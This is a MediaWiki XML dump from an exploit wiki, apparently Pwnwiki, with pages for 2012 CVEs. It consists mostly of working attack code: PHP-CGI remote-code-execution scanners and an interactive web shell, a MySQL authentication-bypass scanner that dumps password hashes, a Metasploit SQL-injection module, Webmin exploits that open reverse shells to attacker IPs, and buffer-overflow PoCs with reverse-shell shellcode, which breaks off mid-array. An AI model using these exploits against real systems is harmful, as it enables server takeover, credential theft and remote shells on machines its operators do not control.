    payload = '?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E'
    evalcode = '''&lt;?php echo 'Content-type: text/html\n\n';echo 'Here_is_apache_php_remote_code_exec';exit(1);?&gt;'''
 
    fake_header = {'User-Agent' : 'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25'}
    data =1
    for path in paths:
        attackurl = target_url+path+payload
        html = request_url(attackurl, evalcode, fake_header)
        print "[*] Response is: ", html
        if 'Here_is_apache_php_remote_code_exec' in html:
            print "[*] Finded tag ...this site is vuln"
            print "[*] URL is: ", attackurl
            break
&lt;/pre&gt;</text>
      <sha1>1qtz00wglq43yo7zl5h77rh7gbz3sbg</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2012-1889 Microsoft XML Core Services 任意代碼執行漏洞</title>
    <ns>0</ns>
    <id>732</id>
    <revision>
      <id>974</id>
      <timestamp>2021-04-04T06:09:00Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/CVE-2012-1889.zip"</comment>
      <origin>974</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="h2wmvmgsyecqc7l6flabsn8icrof7ko" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2012-1889.zip</text>
      <sha1>h2wmvmgsyecqc7l6flabsn8icrof7ko</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2012-2122 Oracle MySQL身份驗證繞過漏洞</title>
    <ns>0</ns>
    <id>733</id>
    <revision>
      <id>975</id>
      <timestamp>2021-04-04T06:10:55Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Usage== &lt;pre&gt; php scanner.php 10.0.0.1/18 [block in cidr notation]   Requirements:         php5-cli  &lt;/pre&gt;   ==POC== &lt;pre&gt; &lt;?php /*   l0l get at me ;) - Avinza   CVE-2012-2..."</comment>
      <origin>975</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2479" sha1="9te05n5jcvg0av6ffkl7oev7oi3zd63" xml:space="preserve">==Usage==
&lt;pre&gt;
php scanner.php 10.0.0.1/18 [block in cidr notation] 

Requirements:
        php5-cli

&lt;/pre&gt;


==POC==
&lt;pre&gt;
&lt;?php
/*
  l0l get at me ;) - Avinza
  CVE-2012-2122 scanner
*/
error_reporting(0);
 
 
$me = @$argv[0];
 
if(!isset($argv[1]) || !strpos($argv[1],"/")) {
          printf("php %s %s \n", "{$me}","10.0.0.1/18 [block in cidr notation]");  
          /* clean this shit up */
         exit;
}
 
list($start,$mask) = explode("/",$argv[1]);
 
$block=cidr_gen($start,$mask,TRUE);
 
//echo print_r($block,1)."\n";
 
foreach ($block as $host) {
   $open = fsockopen($host, 3306, $errno, $errstr, 30); /* because im lame */
   $p = uniqid(mt_rand());
   $i = 0;
   
   if($open){  
       printf("#%d accepts connections.\n", $host);
   do {
           $link = @mysql_connect($host, 'root', $p);
           if($link) {
                   printf("Host %s is vulnerable. Proceeding With Dump\n", $host);              
                     $sql = "SELECT user,password from mysql.user";
                     /* dump hashes (replace with whatever query */
                     mysql_select_db('information_schema');                
                     $results = mysql_query($sql);                
                   if($results) {                    
                    printf(" %s ","\n");                
                     while($row = mysql_fetch_assoc($results)) {                      
                       var_dump($row);                    
                     printf(" %s ","\n");                  
                     }                  
                   } else {                    
                     printf(" %s ", "Host Appears to Be Vuln But Query Failed: [{$sql}]: " . mysql_error());                                        
                   }                    
           }        
           //printf("#%d Attempts.\n", $i);        
          $i++;      
   } while($i &lt; 512);  
  }  
 }
 
function cidr_gen($ip,$bitmask=24,$return_array=FALSE) {
     $corr=(pow(2,32)-1)-(pow(2,32-$bitmask)-1);
     $first=ip2long($ip) &amp; ($corr);
     $length=pow(2,32-$bitmask)-1;
     if (!$return_array) {
     return array(
         'first'=&gt;$first,
         'size'=&gt;$length+1,
         'last'=&gt;$first+$length,
         'first_ip'=&gt;long2ip($first),
         'last_ip'=&gt;long2ip($first+$length)
         );
     }
     $ips=array();
     for ($i=0;$i&lt;=$length;$i++) {
         $ips[]=long2ip($first+$i);
     }
     return $ips;
}
 
?&gt;

&lt;/pre&gt;</text>
      <sha1>9te05n5jcvg0av6ffkl7oev7oi3zd63</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2012-2688 PHP before 5.3.15 and 5.4.x before 5.4.5 緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>734</id>
    <revision>
      <id>976</id>
      <timestamp>2021-04-04T06:12:56Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; #!/usr/bin/python import requests import sys  if len(sys.argv) != 2:     print("Usage: sh.py &lt;target&gt;")     sys.exit(0)  target = sys.argv[1] url = 'http://' + t..."</comment>
      <origin>976</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1904" sha1="ehg43xk29v46y47og7wb5pdn7d0bzfc" xml:space="preserve">==POC==
&lt;pre&gt;
#!/usr/bin/python
import requests
import sys

if len(sys.argv) != 2:
    print("Usage: sh.py &lt;target&gt;")
    sys.exit(0)

target = sys.argv[1]
url = 'http://' + target + '/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input'
payload = "&lt;?php system('cmd');die(); ?&gt;"
try:
    vuln1 = requests.post(url, data=payload.replace('cmd', 'uname -a'))
except Exception as msg:
    print('%s: %s' % (target, msg))
    quit()
    
print('%s: Connection suceeded' % target)


if len(vuln1.text) &gt; 120:
    print("SHELL FAILED: Can not create a shell")
    quit()
    
if not 'linux' in vuln1.text.lower() and not 'mac' in vuln1.text.lower():
    vuln2 = requests.post(url, data=payload.replace('cmd', 'ver'))
    if not 'windows' in vuln2.text.lower():
        print("SHELL FAILED: Can't not create a shell")
        quit()
    oper = 'win'
    print('''%s
(c) Microsoft Corporation. All rights reserved.
''' % vuln2)
    end = '\n'
    
else:
    oper = 'unix'
    usr = requests.post(url, data=payload.replace('cmd', 'whoami')).text
    end = ''
    print('')
    
    
while True:
    try:
        pth = requests.post(url, data="&lt;?php echo getcwd(); ?&gt;").text
        if oper == 'win':
            cmd = input("%s&gt; " % pth)
        else:
            priv = '$'
            if usr == 'root':
                priv = '#'
            if usr != 'root' and '/home/%s' % usr in pth:
                pth = '~%s' % pth.replace('/home/%s', '')
            cmd = input("%s@%s:%s%s" % (usr, target, pth, priv))

        if cmd.replace(' ', '')[2:] == 'cd':
            cmd = "&lt;?php chdir(%s); ?&gt;" % cmd.replace(' ', '')[:2]
        data = payload.replace('cmd', cmd)
        resp = requests.post(url, data=data)
        print(resp.text + end)
    except KeyboardInterrupt:
        print("^C")
        sys.exit(1)
    except:
        print("SHELL FAILED: An unknown error occur")
        quit()


&lt;/pre&gt;</text>
      <sha1>ehg43xk29v46y47og7wb5pdn7d0bzfc</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2012-2763 GIMP 2.6 script-fu緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>517</id>
    <revision>
      <id>720</id>
      <timestamp>2021-03-27T03:30:42Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; //////////////////////////////////////////////////////////////// //                 // // PoC for GIMP &lt;= 2.6 Script-Fu server buffer overflow       // // Author..."</comment>
      <origin>720</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="6178" sha1="0qxoopt1di6d9t1olbh7gbz7fgufcbr" xml:space="preserve">==POC==
&lt;pre&gt;
////////////////////////////////////////////////////////////////
//                 //
// PoC for GIMP &lt;= 2.6 Script-Fu server buffer overflow       //
// Author: Joseph Sheridan           //
// Date: 20/05/2012             //
//                 //
// compile with cl scriptfubof.c /link wsock32.lib          //
////////////////////////////////////////////////////////////////

#define WIN32_LEAN_AND_MEAN
#include
#include
#include
#include
 
#define DEFAULT_PORT 10008
// TCP socket type
#define DEFAULT_PROTO SOCK_STREAM
void senddata();
void recvdata();
WSADATA wsaData;
SOCKET  conn_socket;
char Buffer[2000000];
char inBuffer[128];
 
void Usage()
{
 printf("Usage: scriptfubof servername portnumber\n");
 fflush(stdout);
 exit(1);
}
 
int main(int argc, char *argv[])
{
 
 // default to localhost
 char *server_name= "localhost";
 unsigned short port = DEFAULT_PORT;
 int i, loopcount, maxloop=-1;
 int retval;
 unsigned int addr;
 int socket_type = DEFAULT_PROTO;
 struct sockaddr_in server;

 if (argc &lt; 3) {
  Usage();
 }
 
 if ((retval = WSAStartup(0x202, &amp;wsaData)) != 0)
 {
    fprintf(stderr,"WSAStartup() failed with error %d\n", retval);
  WSACleanup();
  return -1;
 }
 
 // Get portnum
 port = atoi(argv[2]);
 
 memset(&amp;server, 0, sizeof(server));
 server.sin_addr.s_addr = inet_addr(argv[1]);
 server.sin_family = AF_INET;
 server.sin_port = htons(port);
 
 conn_socket = socket(AF_INET, socket_type, 0); /* Open a socket */
 if (conn_socket &lt;0 )
 {
  fprintf(stderr,"Client: Error Opening socket: Error %d\n", WSAGetLastError());
  WSACleanup();
  return -1;
 }
 
 if (connect(conn_socket, (struct sockaddr*)&amp;server, sizeof(server)) == SOCKET_ERROR)
 {
  fprintf(stderr,"Client: connect() failed: %d\n", WSAGetLastError());
  WSACleanup();
  return -1;
 }
 
 // Send the data
 senddata();

 // recieve a msg
 recvdata();
 
 closesocket(conn_socket);
 WSACleanup();
 
return 0;
}

void senddata() {

 int loopcount = 0, retval =0;
 unsigned char command[]="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
  
 
 Buffer[0]='\x47'; //Magic byte 'G'
 Buffer[1]=sizeof(command)/256; //High byte of L - L div 256
 Buffer[2]=sizeof(command)%256; //Low byte of L - L mod 256
 strcpy(&amp;Buffer[3],command);
 
 retval = send(conn_socket, Buffer, sizeof(command) +3, 0);
 if (retval == SOCKET_ERROR)
 {
  fprintf(stderr,"Client: send() failed: error %d.\n", WSAGetLastError());
  WSACleanup();
  return;
 }
 else
   printf("Client: send() is OK.\n");
 printf("Client: Sent data \"%s\"\n", Buffer);
 
}

void recvdata() {
 int i=0;
 int retval=0;
 memset(inBuffer,0,128);
 
 retval = recv(conn_socket, inBuffer, 128, 0);
 printf("retval is :%d\n", retval);
 printf("first char is: %x\n", inBuffer[0]);
 if (retval == SOCKET_ERROR)
   {
  fprintf(stderr,"Client: recv() failed: error %d.\n", WSAGetLastError());
  closesocket(conn_socket);
  WSACleanup();
  return;
 }
 else {
  printf("Client: recv() is OK.\n");
  
  // print the message contents...
  
  for (i=0;i   printf("%c", inBuffer[i]);
   
  }
  printf("\n");
  fflush(stdout);
   }

}

&lt;/pre&gt;</text>
      <sha1>0qxoopt1di6d9t1olbh7gbz7fgufcbr</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2012-2962 Dell SonicWALL Scrutinizer 9 SQL注入漏洞</title>
    <ns>0</ns>
    <id>2784</id>
    <revision>
      <id>3285</id>
      <timestamp>2021-05-26T01:10:18Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web..."</comment>
      <origin>3285</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3350" sha1="1ntu5kaqvxmietnsm47flv815tjhjez" xml:space="preserve">==EXP==
&lt;pre&gt;
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 &lt; Msf::Exploit::Remote
 Rank = ExcellentRanking

 include Msf::Exploit::Remote::HttpClient

 def initialize(info={})
  super(update_info(info,
   'Name'           =&gt; "Dell SonicWALL Scrutinizer 9 SQL Injection",
   'Description'    =&gt; %q{
     This module exploits a vulnerability found in Dell SonicWall Scrutinizer.
    While handling the 'q' parameter, the PHP application does not properly filter
    the user-supplied data, which can be manipulated to inject SQL commands, and
    then gain remote code execution.  Please note that authentication is NOT needed
    to exploit this vulnerability.
   },
   'License'        =&gt; MSF_LICENSE,
   'Author'         =&gt;
    [
     'muts',
     'dookie',
     'sinn3r'
    ],
   'References'     =&gt;
    [
     ['CVE', '2012-2962'],
     ['OSVDB', '84232'],
     ['EDB', '20033'],
     ['BID', '54625'],
     ['URL', 'http://www.sonicwall.com/shared/download/Dell_SonicWALL_Scrutinizer_Service_Bulletin_for_SQL_injection_vulnerability_CVE.pdf']
    ],
   'Payload'        =&gt;
    {
     'BadChars' =&gt; "\x00"
    },
   'Platform'       =&gt; 'php',
   'Arch'           =&gt; ARCH_PHP,
   'Targets'        =&gt;
    [
     # According to advisory, version 9.5.1 and before are vulnerable.
     # But was only able to test this on 9.0.1.0
     ['Dell SonicWall Scrutinizer 9.5.1 or older', {}]
    ],
   'Privileged'     =&gt; false,
   'DisclosureDate' =&gt; "Jul 22 2012",
   'DefaultTarget'  =&gt; 0))

   register_options(
    [
     OptString.new('TARGETURI', [true, 'The path to the SonicWall Scrutinizer\'s statusFilter file', '/d4d/statusFilter.php']),
     OptString.new('HTMLDIR',   [true, 'The HTML root directory for the web application', 'C:\\Program Files\\Scrutinizer\\html\\'])
    ], self.class)
 end


 def check
  res = send_request_raw({'uri'=&gt;target_uri.host})
  if res and res.body =~ /\&lt;title\&gt;Scrutinizer\&lt;\/title\&gt;/ and
             res.body =~ /\&lt;div id\=\'.+\'\&gt;Scrutinizer 9\.[0-5]\.[0-1]\&lt;\/div\&gt;/
   return Exploit::CheckCode::Vulnerable
  end

  return Exploit::CheckCode::Safe
 end


 def exploit
  peer = "#{rhost}:#{rport}"
  p = "&lt;?php #{payload.encoded} ?&gt;"
  hex_payload = p.unpack("H*")[0]
  php_fname   = Rex::Text.rand_text_alpha(5) + ".php"
  rnd_txt     = Rex::Text.rand_text_alpha_upper(3)

  print_status("#{peer} - Sending SQL injection...")
  res = send_request_cgi({
   'uri'       =&gt; target_uri.path,
   'method'    =&gt; 'POST',
   'vars_post' =&gt; {
    'commonJson' =&gt; 'protList',
    'q' =&gt; "#{rnd_txt}' union select 0x#{hex_payload},0 into outfile '../../html/d4d/#{php_fname}'#"
   }
  })

  if res and res.body !~ /No Results Found/
   print_error("#{peer} - I don't think the SQL Injection attempt worked")
   return
  elsif not res
   print_error("#{peer} - No response from the server")
   return
  end

  # For debugging purposes, this is useful
  vprint_status(res.to_s)

  target_path = "#{File.dirname(target_uri.path)}/#{php_fname}"
  print_status("#{peer} - Requesting: #{target_path}")
  send_request_raw({'uri' =&gt; target_path})

  handler
 end
end


&lt;/pre&gt;</text>
      <sha1>1ntu5kaqvxmietnsm47flv815tjhjez</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2012-2982 Webmin 1.590任意命令執行漏洞</title>
    <ns>0</ns>
    <id>735</id>
    <revision>
      <id>977</id>
      <timestamp>2021-04-04T06:17:28Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== ===web.py=== &lt;pre&gt; #!/usr/bin/env python  #usage: python3 web.py &lt;targetIP&gt; import sys, requests, string, secrets  targetIP = sys.argv[1] lhost = "10.10.10.10" #attack..."</comment>
      <origin>977</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3851" sha1="e1xctzn4rqr9h9zssbs7i0vjfnhvxz1" xml:space="preserve">==POC==
===web.py===
&lt;pre&gt;
#!/usr/bin/env python

#usage: python3 web.py &lt;targetIP&gt;
import sys, requests, string, secrets

targetIP = sys.argv[1]
lhost = "10.10.10.10" #attacker IP
lport = "53" #listening port

data = {'page' : "%2F", 'user' : "user1", 'pass' : "1user"}
url = f"http://{targetIP}/session_login.cgi"

r = requests.post(url, data=data, cookies={"testing":"1"}, verify=False, allow_redirects=False)

if r.status_code == 302 and r.cookies["sid"] != None:
	print("[+] Login successful, executing payload")
else:
	print("[-] Failed to login")

sid = r.cookies["sid"]

def rand():
	alphaNum = string.ascii_letters + string.digits
	randChar = ''.join(secrets.choice(alphaNum) for i in range(5))
	return randChar

def payload():
	payload = f"bash -c 'exec bash -i &amp;&gt;/dev/tcp/{lhost}/{lport}&lt;&amp;1'"
	return payload

exp = f"http://{targetIP}/file/show.cgi/bin/{rand()}|{payload()}|"

req = requests.post(exp, cookies={"sid":sid}, verify=False, allow_redirects=False)

&lt;/pre&gt;

===gamezone.py===
&lt;pre&gt;
#!/usr/bin/env python

#CVE-2012-2982 translated from ruby metasploit module (/webmin_show_cgi_exec.rb) 
#program outline:
	# - POST request with compromised creds to get the cookie
	# - exploit using invalid characters to get system shell
	# - fetches system shell as root
	# - sends shell through socket to listening attacker IP
#usage: 
	# - MUST BE SSH TUNNELED INTO MACHINE TO ACCESS localhost
	# - python gamezone.py 
	# - listen with nc -nlvp 4445 on attacker

import sys, os, subprocess, requests, socket, string, secrets, base64

lhost = "10.10.174.47" #attacker IP CHANGE, needs to be a string to convert in payload function
lport = "4445" # listening port, string to convert in payload function

#Login with compromised creds and print good status response
creds = {'page' : "%2F", 'user' : "agent47", 'pass' : "videogamer124"} #must be A dictionary, list of tuples, bytes or a file object
url = "http://localhost:10000/session_login.cgi"

r = requests.post(url, data=creds, cookies={"testing":"1"}, verify=False, allow_redirects=False) #send POST request to login 
#if status code 302 found and sid not empty 
if r.status_code == 302 and r.cookies["sid"] != None:
	print("[+] Login successful, executing payload (listen for shell)")
else:
	print("[-] Failed to login")

sid = r.headers['Set-Cookie'].replace('\n', '').split('=')[1].split(";")[0].strip() #replace the sid cookie newline character, split at = and store the second element (sid) of array, split at ; and stop at first element in array, strip remaining

#generates random characters and delivers the payload
def rand():
	alphaNum = string.ascii_letters + string.digits #custom alphanumeric string variable
	randChar = ''.join(secrets.choice(alphaNum) for i in range(5)) #generate 5 random alphanumeric characters
	return randChar

def payload():
    payload = "python -c \"import base64;exec(base64.b64decode('" #run python command to execute base64
    shell = "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+ lhost + "\"," + lport + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])" #open a socket, send it to the attacking host/port, open the shell
    shell = str.encode(shell) #encode the shellcode as a string
    encoded = base64.b64encode(shell) #encode the string with base64
    encoded = encoded.decode("utf-8") #decode that to be used as a string in the exploit URL
    closing = "'))\"" #close the payload
    payload += encoded #update the payload to contain the encoded/decoded parameters
    payload += closing
    return payload

exp = "http://localhost:10000/file/show.cgi/bin/" + "%s|%s|" % (rand(), payload())

req = requests.post(exp, cookies={"sid":sid}, verify=False, allow_redirects=False) #send POST request to upload shellcode 

&lt;/pre&gt;</text>
      <sha1>e1xctzn4rqr9h9zssbs7i0vjfnhvxz1</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2012-4431 Apache Tomcat CSRF漏洞</title>
    <ns>0</ns>
    <id>736</id>
    <revision>
      <id>978</id>
      <timestamp>2021-04-04T06:19:33Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/CVE-2012-4431.zip"</comment>
      <origin>978</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="sjc0iiyqjs9kaux41tzkg1pg1phpigw" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2012-4431.zip</text>
      <sha1>sjc0iiyqjs9kaux41tzkg1pg1phpigw</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2012-4681 Oracle Java SE 7任意代碼執行漏洞</title>
    <ns>0</ns>
    <id>737</id>
    <revision>
      <id>979</id>
      <timestamp>2021-04-04T06:21:29Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/CVE-2012-4681.zip"</comment>
      <origin>979</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="3m7o48g2lehzqr3dm6dxn72pyxpop4j" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2012-4681.zip</text>
      <sha1>3m7o48g2lehzqr3dm6dxn72pyxpop4j</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2012-5106 FreeFloat FTP Server 1.0任意代碼執行漏洞</title>
    <ns>0</ns>
    <id>738</id>
    <revision>
      <id>980</id>
      <timestamp>2021-04-04T06:23:44Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "===freefloat-ftp.py=== &lt;pre&gt; #!/usr/bin/python  import socket  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # 774699DB   FFE4             JMP ESP  # bad characters \..."</comment>
      <origin>980</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2568" sha1="kbw3n5qverle8hfrp1t8bra64n82n59" xml:space="preserve">===freefloat-ftp.py===
&lt;pre&gt;
#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 774699DB   FFE4             JMP ESP

# bad characters \x00\x0a\x0d

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.123 LPORT=443 -f c EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -a x86 --platform windows

shellcode=("\xda\xd9\xd9\x74\x24\xf4\x58\x2b\xc9\xbd\x3a\x84\xb7\xdf\xb1"
"\x52\x31\x68\x17\x83\xc0\x04\x03\x52\x97\x55\x2a\x5e\x7f\x1b"
"\xd5\x9e\x80\x7c\x5f\x7b\xb1\xbc\x3b\x08\xe2\x0c\x4f\x5c\x0f"
"\xe6\x1d\x74\x84\x8a\x89\x7b\x2d\x20\xec\xb2\xae\x19\xcc\xd5"
"\x2c\x60\x01\x35\x0c\xab\x54\x34\x49\xd6\x95\x64\x02\x9c\x08"
"\x98\x27\xe8\x90\x13\x7b\xfc\x90\xc0\xcc\xff\xb1\x57\x46\xa6"
"\x11\x56\x8b\xd2\x1b\x40\xc8\xdf\xd2\xfb\x3a\xab\xe4\x2d\x73"
"\x54\x4a\x10\xbb\xa7\x92\x55\x7c\x58\xe1\xaf\x7e\xe5\xf2\x74"
